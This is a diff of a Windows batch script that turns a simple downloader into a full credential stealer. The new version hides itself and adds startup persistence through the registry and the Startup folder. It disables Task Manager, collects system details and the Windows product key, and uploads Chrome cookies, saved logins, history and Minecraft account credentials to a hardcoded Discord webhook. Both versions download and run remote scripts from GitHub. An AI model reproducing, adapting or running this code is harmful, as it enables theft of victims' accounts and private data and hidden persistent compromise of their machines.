@@ -1,56 +1,141 @@
 @echo off
-setlocal
+cls
+setlocal enableextensions && setlocal enabledelayedexpansion
 
-REM Define URLs and paths
-set "strWinURL=https://github.com/invisibleghostshell-ux/last/raw/main/win.cmd"
-set "strPs1URL=https://github.com/invisibleghostshell-ux/last/raw/main/setup.cmd"
-set "strRootPath=%TEMP%\ZZ\"
-set "strPs1Path=%strRootPath%setup.cmd"
-set "strWinPath=%strRootPath%win.cmd"
-set "strWebhookURL=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
-set "intWait=5000"
+:: Hide the script file
+attrib +h +s %0
 
-REM Function to send output to Discord using curl
-:SendToDiscord
-setlocal
-set "message=%~1"
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %strWebhookURL%
-endlocal
-goto :eof
+:: Define variables
+set "valinf=rundll32_%randoM%_toolbar"
+set "reginf=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+set "webhook=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
+  :: Replace with your actual Discord webhook URL
 
-REM Function to download files using curl
-:DownloadFile
-setlocal
-set "url=%~1"
-set "localFile=%~2"
-curl -L -o "%localFile%" "%url%"
-call :SendToDiscord "Downloaded: %url%"
-endlocal
-goto :eof
+:: Add a registry entry to run this script at startup
+reg add %reginf% /v %valinf% /t REG_SZ /d %0 /f > nul
 
-REM Create root folder if it doesn't exist
-if not exist "%strRootPath%" (
-    mkdir "%strRootPath%"
-    call :SendToDiscord "Created root folder: %strRootPath%"
-)
+:: Copy the script to the Startup folder
+copy %0 "%USERPROFILE%\Start Menu\Programs\Startup"
 
-REM Download PowerShell script if it does not exist
-call :SendToDiscord "Starting download of PowerShell script..."
-if not exist "%strPs1Path%" call :DownloadFile "%strPs1URL%" "%strPs1Path%"
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 1: Script set to run at startup and copied to Startup folder.\"}"
 
-REM Download VBS script if it does not exist
-call :SendToDiscord "Starting download of VBS script..."
-if not exist "%strWinPath%" call :DownloadFile "%strWinURL%" "%strWinPath%"
+:: Add a registry entry to run a batch file at user login
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %WINDir%\%a%.bat /f > nul
 
-REM Wait for a few seconds
-call :SendToDiscord "Download completed. Waiting for 5 seconds..."
-timeout /t 5 /nobreak >nul
+:: Disable Task Manager
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
-REM Execute the PowerShell script
-if exist "%strPs1Path%" (
-    call :SendToDiscord "Executing PowerShell script..."
-    start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%strPs1Path%"
-    call :SendToDiscord "Executed: %strPs1Path%"
-)
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 2: Registry entries added.\"}"
 
-endlocal
+:: Change to the user profile directory
+cd %USERPROFILE%
+
+:: Get the public IP address and save it to a file
+curl -s -o IP.txt https://ipv4.wtfismyip.com/text
+set /p IPv4=<IP.txt
+
+:: Save installed application details to a file
+powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > %USERPROFILE%\apps.txt"
+
+:: Upload the application details file
+curl -v -F "file=@%USERPROFILE%\apps.txt" %webhook%
+
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 3: Application details collected and uploaded.\"}"
+
+:: Collect system information and save it to a file
+(
+    echo Username %USERNAME%
+    echo IP %IPv4%
+    echo.
+    ipconfig
+    echo.
+    getmac
+    echo.
+    wmic cpu get caption,name,deviceid,numberofcores,maxclockspeed,status
+    echo.
+    wmic computersystem get totalphysicalmemory
+    echo.
+    wmic partition get name,size,type
+    echo.
+    systeminfo
+    echo.
+    wmic path softwareLicensingService get OA3xOriginalProductKey
+) >> userdata.txt
+
+:: Upload the collected system information
+curl -v -F "file=@%USERPROFILE%\userdata.txt" %webhook%
+
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 4: System information collected and uploaded.\"}"
+
+:: Clean up temporary files
+del userdata.txt
+del apps.txt
+
+:: Change to the user profile directory
+cd %USERPROFILE%
+
+:: Download and execute a VBS script
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs', 'win.vbs')"
+start win.vbs
+
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 5: VBS script downloaded and executed.\"}"
+
+:: Compress and upload various browser and application data
+powershell "Compress-Archive %APPDATA%\.minecraft\mods %APPDATA%\modss.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%APPDATA%\modss.zip" %webhook%
+
+powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies %USERPROFILE%\ChromeCookies.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\ChromeCookies.zip" %webhook%
+
+powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\History %USERPROFILE%\ChromeHistory.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\ChromeHistory.zip" %webhook%
+
+powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Shortcuts %USERPROFILE%\ChromeShortcuts.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\ChromeShortcuts.zip" %webhook%
+
+powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks %USERPROFILE%\ChromeBookmarks.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\ChromeBookmarks.zip" %webhook%
+
+powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data %USERPROFILE%\ChromeLoginData.zip -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\ChromeLoginData.zip" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_msa_credentials.bin %USERPROFILE%\launcher_msa_credentials.bin -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials.bin" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_msa_credentials_microsoft_store.bin %USERPROFILE%\launcher_msa_credentials_microsoft_store.bin -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials_microsoft_store.bin" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_accounts.json %USERPROFILE%\launcher_accounts.json -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_accounts.json" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_accounts_microsoft_store.json %USERPROFILE%\launcher_accounts_microsoft_store.json -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_accounts_microsoft_store.json" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_product_state.json %USERPROFILE%\launcher_product_state.json -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_product_state.json" %webhook%
+
+powershell "Compress-Archive %APPDATA%\.minecraft\launcher_profiles.json %USERPROFILE%\launcher_profiles.json -CompressionLevel 'Fastest'"
+curl -v -F "file=@%USERPROFILE%\launcher_profiles.json" %webhook%
+
+:: Clean up downloaded and temporary files
+del script.vbs
+del modss.zip
+del ChromeCookies.zip
+del ChromeHistory.zip
+del ChromeShortcuts.zip
+del ChromeBookmarks.zip
+del ChromeLoginData.zip
+del launcher_msa_credentials.bin
+del launcher_msa_credentials_microsoft_store.bin
+del launcher_accounts.json
+del launcher_accounts_microsoft_store.json
+del launcher_product_state.json
+del launcher_profiles.json
+
+:: Send final notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 6: All data collected, files compressed, and sent.\"}"
